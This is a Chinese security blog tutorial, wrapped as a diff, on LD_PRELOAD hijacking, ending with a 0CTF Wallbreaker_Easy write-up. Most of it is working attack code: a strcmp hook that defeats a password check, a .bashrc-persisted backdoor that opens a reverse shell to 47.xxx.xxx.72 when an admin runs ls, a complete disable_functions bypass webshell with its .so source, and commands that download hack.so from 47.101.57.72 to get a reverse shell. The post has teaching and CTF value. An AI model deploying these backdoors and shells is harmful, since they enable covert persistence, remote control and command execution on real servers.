@@ -1,0 +1,692 @@
+# 有趣的 LD_PRELOAD
+
+阅读量 **236820**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2021-10-19 16:30:31
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p3.ssl.qhimg.com/t014e4b9237e443c5aa.png)
+
+## 前言
+
+LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime
+linker），它允许你定义在程序运行前优先加载的动态链接库。如果你是个 Web 狗，你肯定知道 LD_PRELOAD，并且网上关于 LD_PRELOAD
+的文章基本都是绕过 disable_functions，都快被写烂了。
+
+今天我们就从浅入深完整的学习一下什么是 LD_PRELOAD，LD_PRELOAD 有什么作用，我们可以如何利用 LD_PRELOAD。
+
+## 首先，什么是链接
+
+程序的链接主要有以下三种：
+
+  * 静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。
+  * 装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。
+  * 运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。
+
+对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布/维护/更新。但是由于程序是在运行时动态加载，这就存在一个问题，假如程序动态加载的函数是恶意的，就有可能导致一些非预期的执行结果或者绕过某些安全设置。
+
+## LD_PRELOAD
+
+LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime
+linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。
+
+> LD_PRELOAD is an optional environmental variable containing one or more
+> paths to shared libraries, or shared objects, that the loader will load
+> before any other shared library including the C runtime library (libc.so)
+> This is called preloading a library.
+
+## LD_PRELOAD Hook
+
+由于 LD_PRELOAD 可以指定在程序运行前优先加载的动态链接库，那我们可以重写程序运行过程中所调用的函数并编译成动态链接库文件，然后通过指定
+LD_PRELOAD 让程序优先加载的这个恶意的动态链接库，最后当程序再次运行时便会加载动态链接库中的恶意函数。具体的操作步骤如下：
+
+  1. 定义与目标函数完全一样的函数，包括名称、变量及类型、返回值及类型等。
+  2. 将包含替换函数的源码编译为动态链接库。
+  3. 通过命令 `export LD_PRELOAD="库文件路径"`，设置要优先替换动态链接库即可。
+  4. 替换结束，要还原函数调用关系，用命令`unset LD_PRELOAD` 解除
+
+下面我们通过一个简单的实例进行演示：
+
+  * passcheck.c
+
+    
+    
+    #include <stdio.h>
+    #include <string.h>
+    
+    int main(int argc, char **argv) {
+        char passwd[] = "password";
+        if (argc < 2) {
+            printf("usage: %s <given-password>\n", argv[0]);
+            return 0;
+        }
+        if (!strcmp(passwd, argv[1])) {
+            printf("\033[0;32;32mPassword Correct!\n\033[m");
+            return 1;
+        } else {
+            printf("\033[0;32;31mPassword Wrong!\n\033[m");
+            return 0;
+        }
+    }
+    
+
+直接将其编译并运行：
+
+    
+    
+    gcc passcheck.c -o passcheck
+    
+
+![](https://p2.ssl.qhimg.com/t01ec8f0a9e47b9afc7.png)
+
+可以看到当输入正确的密码时返回的是 “Password Correct!”，密码错误则返回 “Password Wrong!”。这其中用到了标准 C 函数
+`strcmp` 函数来做比较，这是一个外部调用函数。下面我们尝试重新编写一个与 `strcmp` 同名的函数，并编译成动态链接库，实现劫持原函数的功能。
+
+  * hook_strcmp.c
+
+    
+    
+    #include <stdlib.h>
+    #include <string.h>
+    int strcmp(const char *s1, const char *s2) {
+        if (getenv("LD_PRELOAD") == NULL) {
+            return 0;
+        }
+        unsetenv("LD_PRELOAD");
+        return 0;
+    }
+    
+
+> 由于我们通过 LD_PRELOAD 劫持了函数，劫持后启动了一个新进程，若不在新进程启动前取消
+> LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD，最直观的做法是调用
+> `unsetenv("LD_PRELOAD")`。
+
+执行命令编译生成 hook_strcmp.so：
+
+    
+    
+    gcc -shared -fPIC hook_strcmp.c -o hook_strcmp.so
+    
+
+然后通过环境变量 LD_PRELOAD 来设置 hook_strcmp.so 能被其他调用它的程序优先加载：
+
+    
+    
+    export LD_PRELOAD=$PWD/hook_strcmp.so
+    
+    # 也可以直接 LD_PRELOAD=$PWD/hook_strcmp.so ./passcheck password
+    
+
+然后再次执行 passcheck，发现不管输入什么都会返回 “Password Correct!” 了：
+
+![](https://p3.ssl.qhimg.com/t01578e8e9bf0135ee7.png)
+
+此时我们便成功劫持了原程序 passcheck 中的 `strcmp` 函数。
+
+## 利用 LD_PRELOAD Hook 系统命令并制作后门
+
+当我们得知了一个系统命令所调用的库函数 后，我们可以重写指定的库函数进行劫持。这里我们以 `ls` 命令为例进行演示。
+
+首先查看 `ls` 这一系统命令会调用哪些库函数：
+
+    
+    
+    readelf -Ws /usr/bin/ls
+    
+
+![](https://p1.ssl.qhimg.com/t01d2e439eb22bd62a9.png)
+
+如上图所示可以看到很多库函数，我们随便选择一个合适的进行重写即可，这里我选择的是 strncmp：
+
+  * hook_strncmp.c
+
+    
+    
+    #include <stdlib.h>
+    #include <stdio.h>
+    #include <string.h>
+    
+    void payload() {
+        system("id");
+    }
+    
+    int strncmp(const char *__s1, const char *__s2, size_t __n) {    // 这里函数的定义可以根据报错信息进行确定
+        if (getenv("LD_PRELOAD") == NULL) {
+            return 0;
+        }
+        unsetenv("LD_PRELOAD");
+        payload();
+    }
+    
+
+执行命令编译生成 hook_strcmp.so：
+
+    
+    
+    gcc -shared -fPIC hook_strncmp.c -o hook_strncmp.so
+    
+
+然后通过环境变量 LD_PRELOAD 来设置 hook_strncmp.so 能被其他调用它的程序优先加载：
+
+    
+    
+    export LD_PRELOAD=$PWD/hook_strncmp.so
+    
+
+最后执行 `ls` 发现成功执行了 `id` 命令：
+
+![](https://p2.ssl.qhimg.com/t01bf642124aff2501f.png)
+
+说明此时成功劫持了 `strncmp` 函数。
+
+利用这种思路，我们可以制作一个隐藏得 Linux 后门，比如当管理员执行 `ls` 命令时会反弹一个 Shell：
+
+  * hook_strncmp.c
+
+    
+    
+    #include <stdlib.h>
+    #include <stdio.h>
+    #include <string.h>
+    
+    void payload() {
+        system("bash -c 'bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1'");
+    }
+    
+    int strncmp(const char *__s1, const char *__s2, size_t __n) {    // 这里函数的定义可以根据报错信息进行确定
+        if (getenv("LD_PRELOAD") == NULL) {
+            return 0;
+        }
+        unsetenv("LD_PRELOAD");
+        payload();
+    }
+    
+
+执行命令编译生成 hook_strcmp.so：
+
+    
+    
+    gcc -shared -fPIC hook_strncmp.c -o hook_strncmp.so
+    
+
+然后在 `.bashrc` 中写入：
+
+    
+    
+    export LD_PRELOAD=/root/hook_strncmp.so
+    
+
+![](https://p3.ssl.qhimg.com/t01bb77d05251e4fb07.png)
+
+这样便可以在管理员每次启动终端的时候设置 LD_PRELOAD 了。当管理员执行 `ls` 命令时，便能成功反弹 Shell：
+
+![](https://p5.ssl.qhimg.com/t01d6cb7534d887e7dd.png)
+
+## 利用 LD_PRELOAD 绕过 Disable_Functions
+
+我们经过千辛万苦拿到的 Webshell 居然tmd无法执行系统命令：
+
+![](https://p2.ssl.qhimg.com/t019554d7e3a47fdd98.png)
+
+多半是 disable_functions 惹的祸。查看phpinfo发现确实设置了 disable_functions：
+
+![](https://p4.ssl.qhimg.com/t0144e98ed2362762b3.png)
+
+千辛万苦拿到的Shell却变成了一个空壳，你甘心吗？幸运的是有很多方法可以绕过 disable_functions，其中一种便是利用环境变量
+`LD_PRELOAD` 劫持系统函数，让外部程序加载恶意的动态链接库文件，从而达到执行系统命令的效果。
+
+基于这一思路，将突破 disable_functions 限制执行操作系统命令这一目标，大致分解成以下几个步骤：
+
+  * 查看进程调用的系统函数明细
+  * 找寻内部可以启动新进程的 PHP 函数
+  * 找到这个新进程所调用的系统库函数并重写
+  * PHP 环境下劫持系统函数注入代码
+
+虽然 LD_PRELOAD 为我提供了劫持系统函数的能力，但前提是我得控制 PHP
+启动外部程序才行，并且只要有进程启动行为即可，无所谓是谁。所以我们要寻找内部可以启动新进程的 PHP
+函数。比如处理图片、请求网页、发送邮件等三类场景中可能存在我想要的函数，但是经过验证，发送邮件这一场景能够满足我们的需求，即 mail()。
+
+###  利用 mail() 启动新进程来劫持系统函数
+
+  * main.php
+
+    
+    
+    <?php
+    mail("a@localhost","","","","");
+    ?>s
+    
+
+执行以下命令，可以查看进程调用的系统函数明细：
+
+    
+    
+    strace -f php error_log.php 2>&1 | grep -A2 -B2 execve
+    
+
+![](https://p4.ssl.qhimg.com/t013fe8b568645dc1af.png)
+
+如上图所示，第一个 `execve` 是启动 PHP 解释器，而之后的 `execve` 则启动了新的系统进程，那就是
+`/usr/sbin/sendmail`。我们执行 `readelf` 看看 `sendmail` 这一系统命令会调用哪些库函数：
+
+    
+    
+    readelf -Ws /usr/sbin/sendmail
+    
+
+![](https://p5.ssl.qhimg.com/t01efbf6950d5c7bc86.png)
+
+![](https://p0.ssl.qhimg.com/t0115e6c320ba0ab413.png)
+
+我们随便找一个合适的库函数即可，这里我们选择的是第 82 行的 `getuid`：
+
+  * hook_getuid.c
+
+    
+    
+    #include <stdlib.h>
+    #include <stdio.h>
+    #include <string.h>
+    
+    void payload() {
+        system("bash -c 'bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1'");
+    }
+    
+    uid_t getuid() {
+        if (getenv("LD_PRELOAD") == NULL) {
+            return 0;
+        }
+        unsetenv("LD_PRELOAD");
+        payload();
+    }
+    
+
+执行命令编译生成 hook_getuid.so：
+
+    
+    
+    gcc -shared -fPIC hook_getuid.c -o hook_getuid.so
+    
+
+然后在 PHP 环境下劫持系统函数 getuid 就行了，代码如下：
+
+  * mail.php
+
+    
+    
+    <?php
+    putenv("LD_PRELOAD=/var/tmp/hook_getuid.so");    // 注意这里的目录要有访问权限
+    mail("a@localhost","","","","");
+    ?>
+    
+    // 运行 PHP 函数 putenv(), 设定环境变量 LD_PRELOAD 为 hook_getuid.so, 以便后续启动新进程时优先加载该共享对象。
+    // 运行 PHP 的 mail() 函数, mail() 内部启动新进程 /usr/sbin/sendmail, 由于上一步 LD_PRELOAD 的作用, sendmail 调用的系统函数 getuid() 被优先级更好的 hook_getuid.so 中的同名 getuid() 所劫持。
+    
+
+此时运行 mail.php 便可以成功执行命令并反弹 Shell：
+
+![](https://p1.ssl.qhimg.com/t01416ac66ba3170844.png)
+
+## 利用 error_log() 启动新进程来劫持系统函数
+
+`error_log` 与 `mail` 函数的原理一样，都会启动一个新的系统进程 `/usr/sbin/sendmail`：
+
+利用方式也是一样的，都可以劫持 `getuid` 函数。最后的验证脚本如下：
+
+  * error_log.php
+
+    
+    
+    <?php
+    putenv("LD_PRELOAD=/var/tmp/hook_getuid.so");    // 注意这里的目录要有访问权限
+    error_log("", 1, "", "");
+    ?>
+    
+
+不再赘述。
+
+###  利用 LD_PRELOAD 劫持系统新进程来绕过
+
+回想下，我们之所以劫持 `getuid` 函数，是因为 sendmail 程序会调用该函数，但是在真实环境中，该利用条件十分苛刻。比如某些环境中，Web
+禁止启用 senmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 `getuid` 了。所以我们暂且放过 `getuid`
+函数吧，重新找个更加普适的方法。
+
+我们回到 LDPRELOAD 本身，系统通过它预先加载动态链接库，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖
+sendmail 了。这种场景与面向对象的语言中的的构造函数相似。搜索之后发现，GCC 有个 C 语言扩展修饰符
+__attribute__((constructor))，可以让由它修饰的函数在 main()
+之前执行，若它出现在动态链接库中，那么一旦动态链接库被系统加载，将立即执行 _attribute((constructor))
+修饰的函数。这样，我们就不用局限于仅劫持某一函数，而应考虑劫持动态链接库了，也可以说是劫持了一个新进程。
+
+如下，我们可以直接劫持系统命令 ls：
+
+  * hook_ls.c
+
+    
+    
+    #include <stdlib.h>
+    #include <stdio.h>
+    #include <string.h>
+    
+    __attribute__ ((__constructor__)) void preload (void){
+        unsetenv("LD_PRELOAD");
+        system("id");
+    }
+    
+
+编译并测试 `ls` 命令：
+
+    
+    
+    gcc -shared -fPIC hook_ls.c -o hook_ls.so
+    
+
+![](https://p3.ssl.qhimg.com/t016dec82fe3b516b16.png)
+
+如上图，成功劫持，并且不光劫持了 `ls`，只要启动了进程便会进行劫持。
+
+[yangyangwithgnu](https://github.com/yangyangwithgnu) 师傅根据这个思路创建了
+[bypass_disablefunc_via_LD_PRELOAD
+](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)
+这个项目，项目中有这几个关键文件：
+
+![](https://p2.ssl.qhimg.com/t01f60e4e47f6ed6b1b.png)
+
+  * bypass_disablefunc.php：一个用来执行命令的 webshell。
+  * bypass_disablefunc_x64.so 或 bypass_disablefunc_x86.so：用来加载并执行命令的动态链接库文件，分为 64 位的和 32 位的。
+  * bypass_disablefunc.c：用来编译生成上面的动态链接库文件。
+
+bypass_disablefunc.c的源码如下：
+
+    
+    
+    #define _GNU_SOURCE
+    
+    #include <stdlib.h>
+    #include <stdio.h>
+    #include <string.h>
+    
+    
+    extern char** environ;
+    
+    __attribute__ ((__constructor__)) void preload (void)
+    {
+        // get command line options and arg
+        const char* cmdline = getenv("EVIL_CMDLINE");
+    
+        // unset environment variable LD_PRELOAD.
+        // unsetenv("LD_PRELOAD") no effect on some 
+        // distribution (e.g., centos), I need crafty trick.
+        int i;
+        for (i = 0; environ[i]; ++i) {
+                if (strstr(environ[i], "LD_PRELOAD")) {
+                        environ[i][0] = '\0';
+                }
+        }
+    
+        // executive command
+        system(cmdline);
+    }
+    
+
+bypass_disablefunc.php 的源码如下：
+
+    
+    
+    <?php
+        echo "<p> <b>example</b>: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so </p>";
+    
+        $cmd = $_GET["cmd"];
+        $out_path = $_GET["outpath"];
+        $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
+        echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
+    
+        putenv("EVIL_CMDLINE=" . $evil_cmdline);    // 通过环境变量 EVIL_CMDLINE 向 bypass_disablefunc_x64.so 传递具体执行的命令行信息
+    
+        $so_path = $_GET["sopath"];
+        putenv("LD_PRELOAD=" . $so_path);
+    
+        mail("", "", "", "");
+        // error_log("", 1, "", "");
+        echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 
+    
+        unlink($out_path);
+    ?>
+    
+
+对于 bypass_disablefunc.php，权限上传到 Web 目录的直接访问，无权限的话可以传到 tmp 目录后用include
+等函数来包含，并且需要用 GET 方法提供三个参数：
+
+  * cmd 参数：待执行的系统命令，如 id 命令。
+  * outpath 参数：保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点。
+  * sopath 参数：指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。
+
+可以看到，bypass_disablefunc.php 的源码也使用了 mail() 函数，但是无需安装 sendmail，只需要 PHP 支持
+putenv()、mail() 即可。如果 mail() 函数也被禁用了，那我们可以在寻找其他可以启动新进程的函数即可，比如 error_log() 等。
+
+使用时，我们想办法将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so 传到目标有权限的目录中：
+
+![](https://p5.ssl.qhimg.com/t01e7df958b7f5d90d5.png)
+
+然后将bypass_disablefunc.php包含进来并使用GET方法提供所需的三个参数：
+
+    
+    
+    /?Ginkgo=aW5jbHVkZSgiL3Zhci90bXAvYnlwYXNzX2Rpc2FibGVmdW5jLnBocCIpOw==&cmd=id&outpath=/tmp/outfile123&sopath=/var/tmp/bypass_disablefunc_x64.so
+    # include("/var/tmp/bypass_disablefunc.php");
+    
+
+如下所示，成功执行命令：
+
+![](https://p5.ssl.qhimg.com/t01b01d90061a4c2a1e.png)
+
+## 活学活用
+
+###  [0CTF/TCTF]Wallbreaker_Easy
+
+进入题目：
+
+![](https://p5.ssl.qhimg.com/t013871a818bcfb230e.png)
+
+有预留的后门，可以执行 phpinfo，如下图发现通过 disable_functions 禁用了大量函数：
+
+![](https://p5.ssl.qhimg.com/t011f18d6385cbc3674.png)
+
+以下函数都被禁用了：
+
+    
+    
+    pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail
+    
+
+####  预期解
+
+这里首先来看预期解。我们知道，要想利用 LD_PRELOAD 绕过
+disable_functions，其中一个至关重要的条件就是能找到可以启动新进程的函数，就比如我们之前讲的 `mail` 函数，但是题目中吧 `mail`
+函数也禁用了。那该如何去绕过呢？
+
+在这里我们发现题目提示：
+
+    
+    
+    So I installed php-imagick in the server, opened a `backdoor` for you.
+    
+
+所以我们主要探究 php-imagick 到底能不能干类似的事情。我们阅读 php-imagick
+源码：[https://github.com/ImageMagick/ImageMagick，在](https://github.com/ImageMagick/ImageMagick%EF%BC%8C%E5%9C%A8)
+ImageMagick-master\PerlMagick\Makefile.nt 中发现以下对应关系：
+
+![](https://p3.ssl.qhimg.com/t016c64a2671c6794da.png)
+
+发现当处理 MPEG 类型的文件时，会调用 ffmpeg 程序，就像之前的 `mail()` 一样，必然会加载动态库函数。属于 MPEG 类型的文件后缀有：
+
+    
+    
+    wmv    mov    m4v    m2v    mp4    mpg    mpeg    mkv    avi    3g2    3gp
+    
+
+这里我们可以使用 wmv，让 php-imagick 去处理 wmv 后缀的文件并触发新进程去进行劫持。
+
+首先编译动态链接库文件：
+
+  * hack.c
+
+    
+    
+    #include <stdlib.h>
+    #include <stdio.h>
+    #include <string.h>
+    
+    __attribute__ ((__constructor__)) void preload (void){
+        unsetenv("LD_PRELOAD");
+        system("bash -c 'bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1'");
+    }
+    
+
+编译：
+
+    
+    
+    gcc -shared -fPIC hack.c -o hack.so
+    
+
+将得到的 hack.so 放在服务器上，再在服务器上创建一个名为 `whoami.wmv` 的文件，然后使用 PHP 的 `copy()`
+函数将他们依次复制到目标主机上：
+
+    
+    
+    backdoor=copy('http://47.101.57.72/hack.so','/tmp/a5edb30f575fb2f877a19b2f62a2e720/hack.so');copy('http://47.101.57.72/whoami.wmv','/tmp/a5edb30f575fb2f877a19b2f62a2e720/whoami.wmv');
+    
+
+![](https://p4.ssl.qhimg.com/t013b1bd985f315a3d4.png)
+
+上传成功：
+
+![](https://p2.ssl.qhimg.com/t01380a3374a78e19f3.png)
+
+然后我们再执行，触发 Imagick：
+
+    
+    
+    backdoor=putenv("LD_PRELOAD=/tmp/a5edb30f575fb2f877a19b2f62a2e720/hack.so");$img = new Imagick('/tmp/a5edb30f575fb2f877a19b2f62a2e720/whoami.wmv');
+    
+
+成功反弹 Shell 并得到 flag：
+
+![](https://p4.ssl.qhimg.com/t01f5b75335d38611d4.png)
+
+####  非预期解
+
+非预期解很简单。由于题目没有没有禁用 `error_log()` 函数，所以我们可以用 `error_log()` 函数代替 `mail()`
+函数来触发新进程。直接用 [yangyangwithgnu](https://github.com/yangyangwithgnu) 师傅的
+[bypass_disablefunc_via_LD_PRELOAD
+](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)
+这个项目好了。
+
+首先对 bypass_disablefunc.php 进行简单的修改，把 `mail("", "", "", "");` 改成 `error_log("",
+1, "", "");`：
+
+    
+    
+    <?php
+        echo "<p> <b>example</b>: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so </p>";
+    
+        $cmd = $_GET["cmd"];
+        $out_path = $_GET["outpath"];
+        $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
+        echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
+    
+        putenv("EVIL_CMDLINE=" . $evil_cmdline);    // 通过环境变量 EVIL_CMDLINE 向 bypass_disablefunc_x64.so 传递具体执行的命令行信息
+    
+        $so_path = $_GET["sopath"];
+        putenv("LD_PRELOAD=" . $so_path);
+    
+        error_log("", 1, "", "");
+        //mail("", "", "", "");
+        echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 
+    
+        unlink($out_path);
+    ?>
+    
+
+然后把 bypass_disablefunc.php 和 bypass_disablefunc_x64.so 依次通过 `copy()`
+函数上传到目标主机：
+
+    
+    
+    backdoor=copy('http://47.101.57.72/bypass_disablefunc.txt','/tmp/a5edb30f575fb2f877a19b2f62a2e720/bypass_disablefunc.php');copy('http://47.101.57.72/bypass_disablefunc_x64.so','/tmp/a5edb30f575fb2f877a19b2f62a2e720/bypass_disablefunc_x64.so');
+    
+
+![](https://p5.ssl.qhimg.com/t0140d07353d81c672f.png)
+
+然后发送以下请求即可执行命令：
+
+    
+    
+    GET: /?cmd=ls /&outpath=/tmp/a5edb30f575fb2f877a19b2f62a2e720/out.txt&sopath=/tmp/a5edb30f575fb2f877a19b2f62a2e720/bypass_disablefunc_x64.so
+    
+    POST: backdoor=include('/tmp/a5edb30f575fb2f877a19b2f62a2e720/bypass_disablefunc.php');
+    
+
+![](https://p2.ssl.qhimg.com/t0187899bf68d8504f0.png)
+
+![](https://p5.ssl.qhimg.com/t01c44042b0022336aa.png)
+
+## Ending……
+
+![](https://p0.ssl.qhimg.com/t015b6028b49010a14c.jpg)
+
+> 参考：
+>
+> <https://www.freebuf.com/articles/web/192052.html>
+>
+> <https://github.com/yangyangwithgnu>
+>
+> <https://cloud.tencent.com/developer/article/1683272>
+>
+> <https://blog.csdn.net/qq_38154820/article/details/106330120>
+>
+> <https://www.exploit-db.com/papers/13233>
+>
+>
+> <https://wooyun.js.org/drops/%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FLD_PRELOAD%E6%9D%A5%E7%BB%95%E8%BF%87php%20disable_function%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4.html>
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **WHOAMI** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/254388](/post/id/254388)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [CTF](/tag/CTF)
+  * [Web安全](/tag/Web安全)
+
+ **+1** __10赞
+
+ __收藏
+
+![](https://thirdqq.qlogo.cn/g?b=oidb&k=HN3c2Tzia2RGtxxlcskYgyw&s=40&t=1575959591)
+WHOAMI
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
